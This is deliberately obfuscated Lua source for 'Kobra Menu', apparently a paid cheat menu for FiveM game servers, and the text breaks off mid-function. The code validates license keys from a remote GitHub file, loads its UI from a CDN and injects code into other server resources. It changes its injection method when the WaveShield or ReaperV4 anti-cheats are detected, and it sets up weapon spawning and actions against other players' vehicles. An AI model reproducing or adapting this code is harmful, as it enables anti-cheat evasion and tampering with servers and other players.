MachoLockLogger(1094 -(731 + 362) );local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v119,v120) local v121=0;local v122;while true do if (v121==(0 -0)) then v122="";for v665=1, #v119 do local v666=string.byte(v119,v665);v122=v122   .. string.char((v666-v120)%(905 -649) ) ;end v121=35 -(31 + 3) ;end if (v121==(1 + 0)) then if DEBUG then local v766={};for v836=1, #v122 do v766[v836]=string.byte(v122,v836);end print("[KOBRA Safety] Decoded secret: "   .. table.concat(v766,",") );end return v122;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v123=0 -0 ;local v124;while true do if (v123==0) then v124=GetCloudTimeAsInt();return ((v124>(0 -0)) and v124) or (1812 -(1293 + 519)) ;end end end local function v7(v125) local v126=0 -0 ;local v127;local v128;local v129;local v130;local v131;local v132;local v133;while true do if (v126==(4 -2)) then return (v133 * (165224 -78824)) + (tonumber(v130) * (15523 -11923)) + (tonumber(v131) * 60) + tonumber(v132) ;end if (v126==(2 -1)) then if  not v127 then return nil;end v133=((tonumber(v127) -1970) * 365) + math.floor((tonumber(v127) -(1043 + 926))/(1 + 3) ) + ((tonumber(v128) -(2 -1)) * (7 + 23)) + tonumber(v129) ;v126=1 + 1 ;end if (0==v126) then if (type(v125)~="string") then return nil;end v127,v128,v129,v130,v131,v132=string.match(v125,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v126=1 + 0 ;end end end local function v8() local v134=1096 -(709 + 387) ;local v135;local v136;local v137;while true do if (v134==2) then for v667,v668 in ipairs(v136) do if ((type(v668)=="table") and (v668.key==v4)) then if (v668.expires and (type(v668.expires)=="string")) then local v965=1858 -(673 + 1185) ;local v966;while true do if (v965==(2 -1)) then if (v966>v137) then return true,"Key valid (not expired)",v966;else return false,"Key expired",v966;end break;end if (v965==0) then v966=v7(v668.expires);if  not v966 then return false,"Bad expiry format";end v965=3 -2 ;end end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end if (v134==0) then if  not v3 then return false,"No key list available";end v135,v136=pcall(json.decode,v3);v134=1;end if (v134==1) then if ( not v135 or  not v136 or (type(v136)~="table")) then return false,"Key list invalid";end v137=v6();v134=2;end end end local v9,v10,v11=v8();if  not v9 then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,16 -6 );return;end Citizen.CreateThread(function() if (v11 and (v11>0)) then local v495=v6();local v496=v11-v495 ;if (v496>(0 + 0)) then local v669=0 + 0 ;local v670;local v671;local v672;while true do if (v669==(0 -0)) then v670=math.floor(v496/86400 );v671=math.floor((v496%(21221 + 65179))/(7178 -3578) );v669=1;end if (v669==(1 -0)) then v672=string.format("Your key is valid. Expires in %d days and %d hours.",v670,v671);MachoMenuNotification("KOBRA",v672,1885 -(446 + 1434) );break;end end else MachoMenuNotification("KOBRA","Key expired.",10);end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",1288 -(1040 + 243) );end end);local v12={};local v13=false;local v14=nil;local v15=1;local v16={};local v17=v16;local v18=nil;local v19=1;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=2 -1 ;local v35=1848 -(559 + 1288) ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1;local v40=false;local v41=false;local v42=false;local v43=false;local v44={[18 + 9 ]="Escape",[63 + 49 ]="F1",[82 + 31 ]="F2",[96 + 18 ]="F3",[115]="F4",[114 + 2 ]="F5",[550 -(153 + 280) ]="F6",[118]="F7",[343 -224 ]="F8",[120]="F9",[121]="F10",[110 + 12 ]="F11",[49 + 74 ]="F12",[101 + 91 ]="`",[45 + 4 ]="1",[50]="2",[51]="3",[38 + 14 ]="4",[80 -27 ]="5",[34 + 20 ]="6",[722 -(89 + 578) ]="7",[41 + 15 ]="8",[118 -61 ]="9",[48]="0",[1238 -(572 + 477) ]="-",[26 + 161 ]="=",[5 + 3 ]="Backspace",[9]="Tab",[10 + 71 ]="Q",[87]="W",[155 -(84 + 2) ]="E",[134 -52 ]="R",[61 + 23 ]="T",[931 -(497 + 345) ]="Y",[3 + 82 ]="U",[13 + 60 ]="I",[1412 -(605 + 728) ]="O",[80]="P",[157 + 62 ]="[",[221]="]",[489 -269 ]="\\",[1 + 19 ]="CapsLock",[240 -175 ]="A",[75 + 8 ]="S",[68]="D",[193 -123 ]="F",[71]="G",[55 + 17 ]="H",[563 -(457 + 32) ]="J",[32 + 43 ]="K",[76]="L",[186]=";",[1624 -(832 + 570) ]="'",[13 + 0 ]="Enter",[5 + 11 ]="Shift",[318 -228 ]="Z",[43 + 45 ]="X",[863 -(588 + 208) ]="C",[86]="V",[66]="B",[210 -132 ]="N",[1877 -(884 + 916) ]="M",[188]=",",[397 -207 ]=".",[111 + 80 ]="/",[17]="Control",[699 -(232 + 421) ]="Delete",[33]="PageUp",[1923 -(1569 + 320) ]="PageDown",[35]="End",[9 + 27 ]="Home",[8 + 30 ]="ArrowUp",[134 -94 ]="ArrowDown",[37]="ArrowLeft",[644 -(316 + 289) ]="ArrowRight"};local v45={[27]=322,[292 -180 ]=14 + 274 ,[1566 -(666 + 787) ]=289,[114]=595 -(360 + 65) ,[108 + 7 ]=421 -(79 + 175) ,[182 -66 ]=166,[92 + 25 ]=167,[118]=514 -346 ,[228 -109 ]=169,[1019 -(503 + 396) ]=56,[302 -(92 + 89) ]=110 -53 ,[63 + 59 ]=204 + 140 ,[481 -358 ]=48 + 297 ,[437 -245 ]=213 + 30 ,[49]=157,[24 + 26 ]=481 -323 ,[7 + 44 ]=244 -84 ,[1296 -(485 + 759) ]=379 -215 ,[1242 -(442 + 747) ]=1300 -(832 + 303) ,[1000 -(88 + 858) ]=49 + 110 ,[55]=161,[56]=162,[48 + 9 ]=7 + 156 ,[837 -(766 + 23) ]=82,[933 -744 ]=84,[187]=83,[8]=241 -64 ,[23 -14 ]=125 -88 ,[81]=44,[1160 -(1036 + 37) ]=23 + 9 ,[133 -64 ]=37 + 9 ,[1562 -(641 + 839) ]=958 -(910 + 3) ,[213 -129 ]=1929 -(1466 + 218) ,[89]=114 + 132 ,[1233 -(556 + 592) ]=108 + 195 ,[881 -(329 + 479) ]=74,[933 -(174 + 680) ]=683 -484 ,[165 -85 ]=5 + 2 ,[958 -(396 + 343) ]=4 + 35 ,[221]=1517 -(29 + 1448) ,[220]=36,[1409 -(135 + 1254) ]=515 -378 ,[303 -238 ]=34,[56 + 27 ]=33,[1595 -(389 + 1138) ]=604 -(102 + 472) ,[67 + 3 ]=49,[40 + 31 ]=44 + 3 ,[72]=1619 -(320 + 1225) ,[74]=553 -242 ,[46 + 29 ]=311,[76]=1471 -(157 + 1307) ,[2045 -(821 + 1038) ]=201 -120 ,[25 + 197 ]=82,[22 -9 ]=7 + 11 ,[16]=21,[90]=49 -29 ,[1114 -(834 + 192) ]=73,[67]=26,[6 + 80 ]=0 + 0 ,[2 + 64 ]=44 -15 ,[78]=553 -(300 + 4) ,[21 + 56 ]=638 -394 ,[550 -(112 + 250) ]=82,[76 + 114 ]=202 -121 ,[191]=48 + 35 ,[9 + 8 ]=36,[35 + 11 ]=89 + 89 ,[25 + 8 ]=1424 -(1001 + 413) ,[34]=24 -13 ,[35]=1095 -(244 + 638) ,[729 -(627 + 66) ]=634 -421 ,[38]=629 -(512 + 90) ,[1946 -(1665 + 241) ]=173,[754 -(373 + 344) ]=79 + 95 ,[39]=47 + 128 };local v46={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v47=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v48=((v47=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v49(v138) MachoInjectResource("any",v138);end v12.Debug=function(v139,v140,v141) local v142=0 -0 ;local v143;local v144;while true do if ((1 -0)==v142) then print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v144,v141));break;end if (v142==(1099 -(35 + 1064))) then v143={red="^1",yellow="^3",green="^2",info="^5"};v144=v143[v140] or "^5" ;v142=1;end end end;v12.SendMessage=function(v145,v146) if (v14 and v146) then MachoSendDuiMessage(v14,json.encode(v146));end end;v12.Notify=function(v147,v148,v149,v150,v151) v147:SendMessage({action="showNotification",type=v148,title=v149,desc=v150,duration=v151});end;v12.GetMenuPath=function(v152) local v153=0 + 0 ;local v154;while true do if (v153==1) then return v154;end if (v153==(0 -0)) then v154={"Kobra Menu by JayMods"};for v673=1237 -(298 + 938) , #v21 do table.insert(v154,v21[v673]);end v153=1260 -(233 + 1026) ;end end end;v12.UpdateElements=function(v155,v156) local v157=1666 -(636 + 1030) ;local v158;while true do if (v157==(0 + 0)) then if ( not v156 or (type(v156)~="table")) then return;end v158={action="updateElements",elements=v156,index=v15-(1 + 0) ,path=v155:GetMenuPath()};v157=1 + 0 ;end if (v157==(1 + 0)) then if (v18 and (type(v18)=="table") and ( #v18>(221 -(55 + 166)))) then v158.categories=v18;v158.categoryIndex=(v19 or 1) -1 ;end v155:SendMessage(v158);break;end end end;v12.Initialize=function(v159) local v160="https://rawcdn.githack.com/WM5M/kobra-ui2/2daf6469485a4753166d641be83ff88e318ca6b1/index.html";v14=MachoCreateDui(v160);if v14 then local v497=0;while true do if (v497==(1 + 0)) then v159:Debug("green","Kobra UI loaded successfully!");break;end if (v497==0) then v159:Debug("yellow","Creating & Initializing Kobra DUI...");MachoShowDui(v14);v497=1 + 0 ;end end else v159:Debug("red","Failed to load Kobra UI!");end end;v12.HideUI=function(v161,v162) local v163=0 -0 ;while true do if (v163==(298 -(36 + 261))) then v161:SendMessage({action="keydown",index=0 -0 });v161:SendMessage({action="showUI",visible=false,index=1368 -(34 + 1334) });break;end if (v163==0) then if v162 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v163=1 + 0 ;end end end;v12.SendMessage=function(v164,v165) local v166=0 + 0 ;while true do if (v166==0) then if ( not v14 or  not v165 or (type(v165)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v165));break;end end end;v12.ShowUI=function(v167) local v168=0;local v169;while true do if (v168==(1284 -(1035 + 248))) then if (v18 and ( #v18>(21 -(20 + 1)))) then v169.categories=v18;v169.categoryIndex=v19-(1 + 0) ;end v167:SendMessage(v169);break;end if (v168==(319 -(134 + 185))) then v13=true;v169={action="showUI",visible=true,elements=v17,index=v15-(1134 -(549 + 584)) ,path=v167:GetMenuPath(),username=Username or "KobraBypass" ,header="JayMods",theme="kobra-red-black"};v168=1;end end end;v12.UpdateElements=function(v170,v171) if ( not v171 or (type(v171)~="table")) then return;end local v172={action="updateElements",elements=v171,index=v15-(686 -(314 + 371)) ,path=v170:GetMenuPath(),header="JayMods"};if (v18 and ( #v18>0)) then local v498=0 -0 ;while true do if (v498==0) then v172.categories=v18;v172.categoryIndex=(v19 or 1) -(969 -(478 + 490)) ;break;end end end v170:SendMessage(v172);end;v12.IsShiftHeld=function(v173) return v26;end;MachoOnKeyDown(function(v174) if ((v174==(9 + 7)) or (v174==(1332 -(786 + 386))) or (v174==161)) then v26=true;end end);MachoOnKeyUp(function(v175) if ((v175==(51 -35)) or (v175==(1539 -(1055 + 324))) or (v175==161)) then v26=false;end end);local v59=nil;local function v60(v176,v177,v178,v179) local v180=1340 -(1093 + 247) ;while true do if (v180==(1 + 0)) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v176,value=v59.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v180=1 + 1 ;end if (v180==(0 -0)) then if v59 then return;end v59={title=v176,buffer=v177 or "" ,maxLength=108 -76 ,onConfirm=v178,type=v179 or "typeable" ,closeable=((v179=="keybind") and false) or true ,active=true};v180=2 -1 ;end if (v180==2) then Wait(628 -378 );v12:HideUI(true);v180=2 + 1 ;end if (v180==3) then v24=false;break;end end end MachoOnKeyDown(function(v181) if ( not v59 or  not v59.active) then return;end if (v181==13) then local v499=0;while true do if (v499==(7 -5)) then v59=nil;v24=true;v499=10 -7 ;end if (v499==0) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v499=1;end if ((1 + 0)==v499) then if v59.onConfirm then v59.onConfirm(v59.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v499=4 -2 ;end if (v499==3) then return;end end elseif (v181==8) then if (v59.type=="typeable") then v59.buffer=v59.buffer:sub(689 -(364 + 324) , -2);else v59.buffer="";end elseif (v181==27) then local v840=0;while true do if (v840==(2 -1)) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v840=4 -2 ;end if (v840==(1 + 2)) then return;end if (v840==(0 -0)) then if  not v59.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v840=1 -0 ;end if (v840==(5 -3)) then v59=nil;v24=true;v840=3;end end elseif (v59.type=="keybind") then local v967=0;local v968;while true do if (v967==(1268 -(1249 + 19))) then v968=v44[v181];if v968 then if (v59.buffer~=v968) then v59.buffer=v968;end end break;end end elseif (v59.type=="typeable") then local v1086=0;local v1087;local v1088;while true do if ((0 + 0)==v1086) then v1087={[48]="0",[190 -141 ]="1",[1136 -(686 + 400) ]="2",[51]="3",[41 + 11 ]="4",[282 -(73 + 156) ]="5",[1 + 53 ]="6",[866 -(721 + 90) ]="7",[1 + 55 ]="8",[184 -127 ]="9",[535 -(224 + 246) ]="A",[106 -40 ]="B",[123 -56 ]="C",[68]="D",[13 + 56 ]="E",[2 + 68 ]="F",[71]="G",[72]="H",[54 + 19 ]="I",[74]="J",[149 -74 ]="K",[76]="L",[256 -179 ]="M",[591 -(203 + 310) ]="N",[79]="O",[80]="P",[81]="Q",[2075 -(1238 + 755) ]="R",[6 + 77 ]="S",[1618 -(709 + 825) ]="T",[156 -71 ]="U",[124 -38 ]="V",[951 -(196 + 668) ]="W",[88]="X",[89]="Y",[90]="Z",[189]="-",[738 -551 ]="=",[188]=",",[190]=".",[186]=";",[222]="'",[395 -204 ]="/",[1025 -(171 + 662) ]="`",[125 -(4 + 89) ]=" "};v1088=v1087[v181];v1086=1;end if ((3 -2)==v1086) then if (v1088 and ( #v59.buffer<v59.maxLength)) then local v1364=0 + 0 ;while true do if (v1364==(0 -0)) then if v12:IsShiftHeld() then if v1088:match("%a") then v1088=v1088:upper();elseif (v1088=="-") then v1088="_";end elseif v1088:match("%a") then v1088=v1088:lower();end v59.buffer=v59.buffer   .. v1088 ;break;end end end break;end end end if v59 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v59.title,value=v59.buffer}));end end);CreateThread(function() while true do Wait(0);if (v59~=nil) then local v582=0 + 0 ;while true do if (v582==0) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);v582=1;end if (v582==(1487 -(35 + 1451))) then for v871=1453 -(28 + 1425) ,357 do if ((v871<(2041 -(941 + 1052))) or (v871>90)) then DisableControlAction(0 + 0 ,v871,true);end end break;end end else Wait(2014 -(822 + 692) );end end end);v12.ScrollOne=function(v182,v183) if ( not v183 or ( #v17==(0 -0))) then return;end local v184=0 + 0 ;repeat if (v183=="Up") then local v583=297 -(45 + 252) ;while true do if (v583==0) then v15=v15-1 ;if (v15<1) then v15= #v17;end break;end end elseif (v183=="Down") then local v774=0 + 0 ;while true do if (v774==(0 + 0)) then v15=v15 + (2 -1) ;if (v15> #v17) then v15=434 -(114 + 319) ;end break;end end end v184=v184 + (1 -0) ;if (v184>(256 -56)) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v182:SendMessage({action="keydown",index=v15-(1 + 0) });end end;v12.ScrollTwo=function(v185,v186) local v187=v17[v15];if  not v187 then return;end if (((v187.type=="scrollable") or (v187.type=="scrollable-checkbox")) and v187.values and ( #v187.values>(0 -0))) then local v500=0;while true do if (v500==(1 -0)) then v185:UpdateElements(v17);if ((v187.scrollType=="onScroll") and v187.onSelect) then if (v187.type=="scrollable-checkbox") then v187.onSelect(v187.values[v187.value],v187.checked or false );else v187.onSelect(v187.values[v187.value]);end end break;end if (v500==(1963 -(556 + 1407))) then v187.value=v187.value or (1207 -(741 + 465)) ;if (v186=="Left") then local v872=0;while true do if (v872==0) then v187.value=v187.value-(466 -(170 + 295)) ;if (v187.value<(1 + 0)) then v187.value= #v187.values;end break;end end elseif (v186=="Right") then v187.value=v187.value + 1 + 0 ;if (v187.value> #v187.values) then v187.value=1;end end v500=2 